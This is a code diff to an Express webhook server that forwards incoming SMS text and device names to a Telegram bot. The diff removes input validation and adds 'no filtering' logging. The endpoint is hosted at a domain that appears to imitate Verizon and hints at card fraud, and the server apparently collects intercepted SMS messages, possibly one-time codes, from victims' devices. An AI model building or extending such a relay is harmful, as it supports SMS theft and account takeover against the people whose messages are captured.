@@ -41,27 +41,22 @@ app.get("/verify", (req, res) => {
   });
 });
 
-// Main webhook endpoint - /verify (NO AUTH REQUIRED)
+// Main webhook endpoint - /verify (NO FILTERING, NO AUTH)
 app.post("/verify", async (req, res) => {
   try {
-    // 1. Get data from request (NO AUTH CHECK)
+    // 1. Get data from request
     const { message, device_name } = req.body;
     
     console.log("📨 Webhook request received");
     console.log("📦 Data:", req.body);
     
-    if (!message) {
-      return res.status(400).json({ error: "Missing field: message" });
-    }
-
-    // 2. Format Telegram message
+    // 2. Format Telegram message (NO FILTERING - everything goes through)
     const deviceName = device_name || "Unknown Device";
     const timestamp = new Date().toLocaleString();
     
-    const telegramText = `📱 New SMS received 🍆💪\n\n🎯 ${deviceName}\n✍️ ${message}\n🕐 ${timestamp}`;
+    const telegramText = `📱 New SMS received 🍆💪\n\n🎯 ${deviceName}\n✍️ ${message || "No message content"}\n🕐 ${timestamp}`;
 
     console.log("📤 Sending to Telegram...");
-    console.log("Chat ID:", TELEGRAM_CHAT_ID);
 
     // 3. Send to Telegram
     const telegramResponse = await fetch(TELEGRAM_API_URL, {
@@ -109,4 +104,5 @@ app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Webhook host running on port ${PORT}`);
   console.log(`📡 Endpoint: https://verizon.cardempire.org/verify`);
   console.log(`🔓 No authorization required (public endpoint)`);
+  console.log(`📨 No filtering - all messages forwarded`);
 });
